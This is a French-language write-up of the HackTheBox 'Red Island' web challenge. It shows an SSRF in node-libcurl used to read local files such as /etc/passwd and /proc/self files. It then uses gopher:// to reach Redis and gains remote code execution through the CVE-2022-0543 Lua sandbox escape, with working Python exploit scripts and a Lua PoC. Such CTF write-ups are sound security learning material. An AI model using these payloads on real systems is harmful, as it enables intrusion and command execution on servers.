---
title: Red Island
slug: red_island
date: 2024-06-06 00:00:00+0000
image: cover.png 
categories:
    - Write-ups
tags:
    - HackTheBox
    - Challenge
    - Web
---

# Résumé 

`api/red/generate` endpoint est vulnerable au attaque **SSRF**, la requête envoyé est traité par la bibliothèque *node-libcurl*. Elle peut être utilisé avec beaucoup de protocoles ce qui permet d’investiguer le processus courant :
- `file:///proc/self/cmdline`
- `file:///proc/self/pwd/index.js`

L'implementation de *Redis* permet l'utilisation du protocole `gopher`, la version retourné *5.0.7* vulnerable à la **[CVE-2022-0543](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md)**.

## Introduction

### Ce que j'ai appris

- **SSRF** de base avec **cross-protocol scripting** (`gopher://` schema).
- Interaction *Redis* avec *Lua* sandbox escape.
- Première utilisation de l'outil *Caido*.

## Aperçu général

Aucun code source n'est fourni avec ce défi, j'ai donc directement testé l'application web après m'être connecté. J'ai soumis un *URL* valide d'une image, ce qui a eu pour effet de rendre une image saturé de rouge.

![valid image url](/red_island/screenshots/valid_image_url.png)

Il n'y avait pas grand-chose d'autre à faire avec l'application, c'était la seul interaction possible qu'un utilisateur pouvais faire.

## Enumeration

Pour la première fois j'ai utilisé l'outil [Caido](https://caido.io/), qui est une alternative prometteuse de [Burp Suite](https://portswigger.net/burp). J'ai envoyé la requête dans mon onglet *Replay* pour commencer à testé mon endpoint.

### **SSRF** avec node-libcurl

Pour tester si l'application était vulnerable à une **[Server-Side Request Forgery](https://portswigger.net/web-security/ssrf)**, J'ai tout d'abord envoyé un *URL* qui n'etait pas une image. Si l'application traite la demande correctement, elle aurait dû renvoyer un message d'erreur. Or, ce n'était pas tout à fait le cas...

![valid_url_ssrf](/red_island/screenshots/valid_url_ssrf.png)

J'ai bien reçu un message d'erreur, mais en incluant le corps du lien envoyé.

![SSRF Diagram](/red_island/screenshots/SSRF_Diagram.png)

Ce diagramme résume ce qui se passe pendant une attaque **SSRF** de base. L'entrée est toujours fiable et renvoyée. Si ce type d'entrée utilisateur est autorisé, la gestion des erreurs et la validation des entrées doivent être renforcées pour n'autoriser que certains domaines et renvoyer des messages d'erreur appropriés.

Pour en savoir un peu plus sur la façon dont la demande a été traitée du côté du serveur, je me suis servi de [interactsh](https://app.interactsh.com/#/) pour identifier la bibliothèque utilisée.

```HTTP
GET / HTTP/1.1
Host: nblwybgjkdkdtwjedhnb54rribbndgeea.oast.fun
Accept: */*
User-Agent: node-libcurl/2.3.4
```

la bibliothèque utilisée est [node-libcurl](https://www.npmjs.com/package/node-libcurl), qui supporte une large quantité de protocoles.

> libcurl is a free and easy-to-use client-side URL transfer library, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP. libcurl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, cookies, user+password authentication (Basic, Digest, NTLM, Negotiate, Kerberos), file transfer resume, http proxy tunneling and more!
> - <cite> Official description of the *node-libcurl* library</cite>

En prenant en compte cela, j'ai tenté de lire un fichier local en utilisant le schéma `file://`.

![reading /etc/passwd](/red_island/screenshots/poc_reading_file_with_ssrf.png)

### *Redis* et gopher

Pour en savoir plus sur l'application web en cours d'exécution, j'ai lu le fichier `/proc/self/cmdline`, qui contient la commande utilisée pour démarrer l'application.

![current process running](/red_island/screenshots/reading_current_process.png)

Ensuite, j'ai voulu lire le contenu du fichier `index.js` situé dans `/proc/self/cwd/index.js`.

![current process running](/red_island/screenshots/reading_content_current_process.png)

```js
const express= require('express');
const app= express();
const session= require('express-session');
const RedisStore = require("connect-redis")(session)
const path = require('path');
const cookieParser = require('cookie-parser');
const nunjucks = require('nunjucks');
const routes = require('./routes');
const Database = require('./database');
const { createClient } = require("redis")
const redisClient= createClient({ legacyMode: true })

const db = new Database('/tmp/redisland.db');

app.use(express.json());
app.use(cookieParser());

redisClient.connect().catch(console.error)
<SNIP>
```

[Redis](https://redis.io/) ou **RE**mote **DI**ctionary **S**erver est un service populaire de mise en cache de données en mémoire, Souvent utilisé comme base de données.

Dans cette application, *Redis* est utilisé comme *stockage des sessions* avec `redisClient.connect()`. En l'absence d'options, j'ai supposé qu'il était connecté à l'adresse locale `localhost:6379`.

Je sais que *Redis* implémente [gopher](https://fr.wikipedia.org/wiki/Gopher), qui était une alternative au [World Wide Web](https://fr.wikipedia.org/wiki/World_Wide_Web) dans la fin des années 90.

Etant donné que *node-libcurl* supporte plusieurs protocoles pour la **SSRF**, et que *gopher* peut être utilisé pour communiquer avec le client *Redis*, j'ai effectué une attaque **Cross-Protocol Scripting** en utilisant le schéma `gopher://`.

![URI](/red_island/screenshots/uri_gopher.png)

Pour automatiser cette opération, j'ai écrit un script python:

```python
from urllib.parse import quote
import requests

URL = "http://<TARGET:HOST>/api/red/generate"
payload = quote("""
INFO

quit
""")
input = {"url":f"gopher://localhost:6379/_{payload}"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
           "Content-Type": "application/json",
           "Cookie": "connect.sid=<SESSION_COOKIE>"}

request = requests.post(url=URL, json=input, headers=headers)
print(str(request.json()).replace("\\n", "\n").replace("\\r", ""))
```

J'ai soumis cette *charge utile* pour obtenir plus d'informations sur l'instance *Redis* actuelle.

```prolog
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:636cde3b5c7a3923
redis_mode:standalone
os:Linux 6.1.0-10-amd64 x86_64
arch_bits:64
<SNIP>
```

Une recherche de vulnérabilités dans cette version spécifique de *Redis* (5.0.7) m'a conduit à [CVE-2022-0543](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md), découvert par [Reginaldo Silva](https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce).

## Exploitation

### Why?

Cette vulnérabilité ne provient pas directement de *Redis*. Sur certaines distributions, *Lua* est chargé dynamiquement, ce qui m'a permis de réaliser une **Remote Code Execution** sur l'hôte en échappant a la sandbox de *Lua*.

> This vulnerability existed because the Lua library in Debian/Ubuntu is provided as a dynamic library. A package variable was automatically populated that in turn permitted access to arbitrary Lua functionality.
> - <cite>Vulhub GitHub: *Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543)*</cite>

### PoC

```lua
-- loading "luaopen_io" module from the library to execute a command
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
local io = io_l();
-- executing the command 'id'
local f = io.popen("id", "r");
-- reading and returning the output of the command
local res = f:read("*a");
f:close();
return res
```

J'ai transmis cette *charge utile* a la command [eval](https://redis.io/docs/latest/commands/eval/) du client *Redis*.

```python
from urllib.parse import quote
import requests

URL = "http://<TARGET:HOST>/api/red/generate"
payload = quote("""
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
quit
""")
input = {"url":f"gopher://<TARGET:HOST>:6379/_{payload}"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
           "Content-Type": "application/json",
           "Cookie": "<SESSION_COOKIE>"}

request = requests.post(url=URL, json=input, headers=headers)
print(str(request.json()).replace("\\n", "\n").replace("\\r", ""))
```

J'ai réussi à obtenir la **RCE** sur l'hôte.

```zsh
$ python script.py
{'message': 'Unknown error occured while fetching the image file: $48
uid=101(redis) gid=101(redis) groups=101(redis)

+OK
'}
```

Le flag se trouvait à la *racine* du système en tant qu'exécutable.

```zsh
$ python script.py
{'message': 'Unknown error occured while fetching the image file: $32
HTB{<REDACTED>}
+OK
'}
```

## References

- https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/
- https://www.vaadata.com/blog/wp-content/uploads/2022/01/SSRF_vulnerabilite_cheat_sheet.pdf
- https://www.npmjs.com/package/node-libcurl
- https://docs.kernel.org/filesystems/proc.html
- https://redis.io
- https://fr.wikipedia.org/wiki/Gopher
- https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md
- https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce
